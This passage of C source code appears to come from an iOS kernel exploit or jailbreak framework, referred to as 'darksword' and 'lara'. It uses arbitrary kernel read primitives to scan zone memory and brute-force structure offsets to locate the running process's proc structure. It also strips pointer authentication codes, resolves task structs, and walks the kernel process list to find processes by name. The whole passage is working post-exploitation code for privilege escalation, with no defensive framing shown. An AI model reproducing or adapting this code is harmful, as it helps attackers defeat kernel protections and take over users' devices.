                            cfails = 0;
                            if (zpid == (uint32_t)ourpid) {
                                uint64_t hit = zcand ? zcand : p296;
                                if (zpid_off && zpid_off != PROC_PID_OFFSET) {
                                    filelog_write("[ourproc] Bug #326: page-seed scan switching PID_OFFSET 0x%x -> 0x%x at proc=0x%llx",
                                                  PROC_PID_OFFSET, zpid_off, hit);
                                    PROC_PID_OFFSET = zpid_off;
                                }
                                uint64_t lv = 0;
                                bool lv_ok = ds_kread64_checked(hit + PROC_LIST_OFFSET, &lv);
                                uint64_t ls = pac_strip(lv);
                                bool lhp = is_heap_ptr_relaxed(ls) ||
                                           is_kernel_data_ptr(ls) || ls == 0;
                                uint64_t proc_ro_raw = 0, proc_ro = 0, ro_task_raw = 0, ro_task = 0;
                                bool proc_ro_ok = false, ro_task_ok = false;
                                if (ds_kread64_checked(hit + O_PROC_RO, &proc_ro_raw)) {
                                    proc_ro = pac_strip(proc_ro_raw);
                                    proc_ro_ok = is_kptr(proc_ro);
                                }
                                if (proc_ro_ok && ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &ro_task_raw)) {
                                    ro_task = pac_strip(ro_task_raw);
                                    ro_task_ok = is_kptr(ro_task);
                                }
                                filelog_write("[ourproc] Bug #296/326: pid=%u at 0x%llx pid_off=0x%x list=0x%llx hp=%d ro=%d task=%d",
                                              zpid, hit, PROC_PID_OFFSET, lv, (int)lhp, (int)proc_ro_ok, (int)ro_task_ok);
                                bool name_ok = proc_name_matches_ours(hit);
                                if ((lv_ok && lhp) || ro_task_ok || name_ok) {
                                    add_unique_proc_candidate(proc_candidates, &proc_candidate_count, 192, hit);
                                    discover_name_offset(hit);
                                    char z296name[64] = {0};
                                    if (PROC_NAME_OFFSET) {
                                        if (!kread_proc_name_bounded(hit, PROC_NAME_OFFSET, z296name, sizeof(z296name))) {
                                            strlcpy(z296name, "<unknown>", sizeof(z296name));
                                        }
                                    } else {
                                        strlcpy(z296name, "<unknown>", sizeof(z296name));
                                    }
                                    filelog_write("[ourproc] Bug #296: FOUND proc=0x%llx pid=%d name='%s' proof[list=%d task=%d name=%d]",
                                                  hit, ourpid, z296name, (int)(lv_ok && lhp), (int)ro_task_ok, (int)name_ok);
                                    return hit;
                                }
                            }
                            p296 += ZONE_STRIDE;
                        }
                    }
                }
                filelog_write("[ourproc] Bug #325: local page-seed scan done (%d iters, not found)", total_z296);

                if (proc_candidate_count > 0) {
                    filelog_write("[ourproc] Bug #386: brute-force PID offset on %d safe proc candidates...",
                                  proc_candidate_count);
                    for (int ci = 0; ci < proc_candidate_count; ci++) {
                        uint64_t cproc = proc_candidates[ci];
                        for (uint32_t poff = 0x00; poff <= 0x400; poff += 4) {
                            uint32_t val = 0;
                            /* Bug #454: Bug #386 does the same 4-byte PID sweep as
                             * Bug #266. On 21D61 this can hit addr%8==4 fields like
                             * safe-candidate+0x4 / +0xc / ... and trip the proc-scope
                             * misalignment guard, as seen in fresh runs at
                             * 0xffffffdf0973b004, +0xc, +0x14, ... Use the aligned
                             * helper introduced by Bug #452 here too. */
                            if (!read_u32_aligned_checked(cproc + poff, &val) || val != (uint32_t)ourpid) continue;

                            uint32_t kt_chk = 0xFFFFFFFF;
                            (void)read_u32_aligned_checked(kernproc + poff, &kt_chk);
                            bool task_ok = proc_has_task_proof(cproc);
                            bool name_ok = proc_name_matches_ours(cproc);
                            bool uid_ok = false, gid_ok = false;
                            bool cred_ok = proc_credentials_match_ours(cproc, &uid_ok, &gid_ok);
                            filelog_write("[ourproc] Bug #386: candidate[%d]=0x%llx +0x%x => pid=%d (kernel_task=%u task=%d name=%d uid=%d gid=%d)",
                                          ci, cproc, poff, ourpid, kt_chk,
                                          (int)task_ok, (int)name_ok, (int)uid_ok, (int)gid_ok);

                            if ((kt_chk == 0 && (task_ok || name_ok || cred_ok)) ||
                                (cred_ok && (task_ok || name_ok))) {
                                filelog_write("[ourproc] Bug #386: accepting proc candidate 0x%llx with PID offset 0x%x",
                                              cproc, poff);
                                PROC_PID_OFFSET = poff;
                                discover_name_offset(cproc);
                                return cproc;
                            }
                        }
                    }
                    filelog_write("[ourproc] Bug #386: brute-force on safe proc candidates did not find pid=%d", ourpid);
                }
            } else {
                uint64_t p296 = anchor_min;
                if (p296 < zmin) p296 = zmin;
                p296 &= ~(ZONE_STRIDE - 1ULL);

                uint64_t p296_end = zmax;
                p296_end = (p296_end + (ZONE_STRIDE - 1ULL)) & ~(ZONE_STRIDE - 1ULL);

                filelog_write("[ourproc] Bug #296/320: zone scan "
                              "[0x%llx..0x%llx] stride=0x%llx page_aligned=%d "
                              "anchors=[0x%llx..0x%llx] pid=%d pid_offs=%d/0x%x%s ...",
                              p296, p296_end, ZONE_STRIDE, (int)page_aligned_scan,
                              anchor_min, anchor_max, ourpid,
                              zone_pid_count, zone_pid_offs[0],
                              (zone_pid_count > 1) ? " +0x60" : "");

                int total_z296 = 0;
                int cfails = 0;
                while (p296 < p296_end && total_z296 < ZONE296_MAX) {
                    total_z296++;
                    uint32_t zpid = 0;
                    uint32_t zpid_off = 0;
                    bool z296_ok = false;
                    if (is_heap_ptr_relaxed(p296)) {
                        for (int zoi = 0; zoi < zone_pid_count; zoi++) {
                            uint32_t probe_pid = 0;
                            uint32_t probe_off = zone_pid_offs[zoi];
                            if (!ds_kread32_checked(p296 + probe_off, &probe_pid)) continue;
                            z296_ok = true;
                            if (probe_pid == (uint32_t)ourpid) {
                                zpid = probe_pid;
                                zpid_off = probe_off;
                                break;
                            }
                        }
                    }
                    if (!z296_ok) {
                        cfails++;
                        if (cfails >= 16) {
                            p296 += 0x100000ULL;
                            cfails = 0;
                        } else {
                            p296 += ZONE_STRIDE;
                        }
                    } else {
                        cfails = 0;
                        if (zpid == (uint32_t)ourpid) {
                            if (zpid_off && zpid_off != PROC_PID_OFFSET) {
                                filelog_write("[ourproc] Bug #326: zone scan switching PID_OFFSET 0x%x -> 0x%x at proc=0x%llx",
                                              PROC_PID_OFFSET, zpid_off, p296);
                                PROC_PID_OFFSET = zpid_off;
                            }
                            uint64_t lv = 0;
                            bool lv_ok = ds_kread64_checked(p296 + PROC_LIST_OFFSET, &lv);
                            uint64_t ls = pac_strip(lv);
                            bool lhp = is_heap_ptr_relaxed(ls) || is_kernel_data_ptr(ls) || ls == 0;
                            filelog_write("[ourproc] Bug #296/326: pid=%u at 0x%llx pid_off=0x%x list=0x%llx hp=%d",
                                          zpid, p296, PROC_PID_OFFSET, lv, (int)lhp);
                            if (lv_ok && lhp) {
                                discover_name_offset(p296);
                                char z296name[64] = {0};
                                if (PROC_NAME_OFFSET) {
                                    if (!kread_proc_name_bounded(p296, PROC_NAME_OFFSET, z296name, sizeof(z296name))) {
                                        strlcpy(z296name, "<unknown>", sizeof(z296name));
                                    }
                                } else {
                                    strlcpy(z296name, "<unknown>", sizeof(z296name));
                                }
                                filelog_write("[ourproc] Bug #296: FOUND proc=0x%llx pid=%d name='%s'",
                                              p296, ourpid, z296name);
                                return p296;
                            }
                        }
                        p296 += ZONE_STRIDE;
                    }
                }
                filelog_write("[ourproc] Bug #296: scan done (%d iters, not found)", total_z296);
            }
        }
    }

    filelog_write("[ourproc] FAILED: proc not found with either offset or zone scan");
    return ds_finish_ourproc_scope(0);
}

/* ================================================================
   ourtask: get task for proc
   BUG 3 FIX: use proc_ro→task path with validation
   Original lara: return proc + 0x740  (WRONG on iPad8,9)
   ================================================================ */

/* pac_strip / is_heap_ptr already defined at top of file */

uint64_t ourtask(uint64_t procaddr) {
    if (!procaddr) return 0;

    /* Strategy 1: proc_ro→task path (iOS 15.2+, arm64e) */
    uint64_t proc_ro_raw = 0;
    if (ds_kread64_checked(procaddr + O_PROC_RO, &proc_ro_raw)) {
        uint64_t proc_ro = pac_strip(proc_ro_raw);
        if (is_kptr(proc_ro)) {
            uint64_t task_raw = 0;
            if (ds_kread64_checked(proc_ro + O_PROC_RO_TASK, &task_raw)) {
                uint64_t task = pac_strip(task_raw);
                if ((is_heap_ptr(task) || is_kptr(task)) && task_has_vm_map_sanity(task)) {
                    printf("ourtask: proc_ro=0x%llx → task=0x%llx ✓\n", proc_ro, task);
                    return task;
                }
            }
        }
    }

    /* Strategy 2: scan proc for direct task pointer with vm_map validation */
    printf("ourtask: proc_ro path failed, scanning proc struct...\n");
    for (uint32_t off = 0x10; off <= 0x800; off += 0x08) {
        uint64_t candidate = pac_strip(ds_kread64(procaddr + off));
        if (!(is_heap_ptr(candidate) || is_kptr(candidate))) continue;

        if (task_has_vm_map_sanity(candidate)) {
            printf("ourtask: proc+0x%x → task=0x%llx ✓\n", off, candidate);
            return candidate;
        }
    }

    /* Strategy 3: give up cleanly instead of returning garbage */
    printf("ourtask: FAILED — could not find task struct\n");
    return 0;
}

/* ================================================================
   procbyname: find process by name in kernel proc list
   ================================================================ */

uint64_t procbyname(const char *procname) {
    /* Bug #316: procbyname() can be reached during bootstrap via helpers that
     * discover offsets from our own proc before the final ds_is_ready() flip.
     * Accept the pre-ready bootstrap state as long as early KRW has produced a
     * valid kernel base. */
    if (!ds_is_ready() && ds_get_kernel_base() == 0) {
        printf("darksword not ready (no early KRW)\n");
        return 0;
    }

    if (!procname || strlen(procname) == 0) {
        printf("invalid process name\n");
        return 0;
    }

    if (!g_offsets_ready) init_offsets();

    /* Ensure we have the name offset */
    if (PROC_NAME_OFFSET == 0) {
        /* Try to discover via our own proc first */
        uint64_t self_proc = ds_get_our_proc();
        if (!is_heap_ptr(self_proc)) {
            self_proc = ourproc();
        }
        if (is_heap_ptr(self_proc)) {
            discover_name_offset(self_proc);
        }
        if (PROC_NAME_OFFSET == 0) {
            printf("procbyname: PROC_NAME_OFFSET unknown, aborting instead of guessing\n");
            return 0;
        }
    }

    uint64_t kernprocaddr = kernprocaddress();
    if (!kernprocaddr) {
        printf("procbyname: kernprocaddress failed\n");
        return 0;
    }
    uint64_t kernproc_raw = ds_kread64(kernprocaddr);
    uint64_t kernproc = 0;
    /* Bug #259B: Use g_direct_layout_set path (like ourproc) to handle
     * DATA-proc0 heads correctly. discover_proc_list_layout requires heap. */
    if (g_direct_layout_set) {
        uint64_t stripped = pac_strip(kernproc_raw);
        if (PROC_LIST_OFFSET > 0 && stripped >= PROC_LIST_OFFSET) {
            kernproc = stripped - PROC_LIST_OFFSET;
        } else {
            kernproc = stripped;
        }
    } else if (!discover_proc_list_layout(kernproc_raw, &kernproc)) {
        kernproc = pac_strip(kernproc_raw);
    }
    printf("kernel proc: 0x%llx (list_off=0x%x)\n", kernproc, PROC_LIST_OFFSET);
    uint64_t kbase_pbn = ds_get_kernel_base();
    bool pbn_heap_ok = is_heap_ptr(kernproc);
    if (!pbn_heap_ok && g_direct_layout_set && is_kernel_data_ptr(kernproc)) {
        pbn_heap_ok = true;  /* Bug #259B: DATA-resident proc0 */
    }
    if (!pbn_heap_ok) {
        printf("kernel proc pointer invalid\n");
        return 0;
    }
    printf("looking for process: %s\n", procname);

    uint64_t currentproc = kernproc;
    int count = 0;
    int matches = 0;

    while (currentproc != 0 && count < 4000) {
        bool pbn_ptr_ok = is_heap_ptr(currentproc);
        if (!pbn_ptr_ok && g_direct_layout_set && is_kernel_data_ptr(currentproc)) {
            pbn_ptr_ok = true;
        }
        if (!pbn_ptr_ok) {
            printf("proc pointer invalid at step %d\n", count);
            break;
        }
        char name[64] = {0};
        ds_kread(currentproc + PROC_NAME_OFFSET, name, 32);

        if (strcmp(name, procname) == 0) {
            uint32_t pid = ds_kread32(currentproc + PROC_PID_OFFSET);
            uint32_t uid = ds_kread32(currentproc + PROC_UID_OFFSET);
            uint32_t gid = ds_kread32(currentproc + PROC_GID_OFFSET);
            printf("found process: %s (PID: %d, UID: %d, GID: %d) at 0x%llx\n",
                    name, pid, uid, gid, currentproc);
            matches++;

            return currentproc;
        }

        uint64_t next_raw_pbn = ds_kread64(currentproc + PROC_LIST_OFFSET + PROC_NEXT_OFFSET);
        /* Bug #259B: circular list sentinel detection */
        uint64_t next_stripped_pbn = pac_strip(next_raw_pbn);
        if (next_stripped_pbn == kernprocaddr) {
            printf("proc list sentinel at step %d\n", count);
            break;
        }
        uint64_t next = 0;
        proc_list_next_checked_pid(currentproc, PROC_LIST_OFFSET, PROC_PID_OFFSET, &next);
        bool next_pbn_ok = g_direct_layout_set
                   ? (is_heap_ptr_relaxed(next) || is_kernel_data_ptr(next))
                   : is_heap_ptr(next);
        if (!next_pbn_ok || next == currentproc) {
            printf("proc list ended at step %d\n", count);
            break;
        }
        currentproc = next;
        count++;
    }

    if (matches == 0) {
        printf("process '%s' not found after %d iterations\n", procname, count);
    }

    return 0;
}
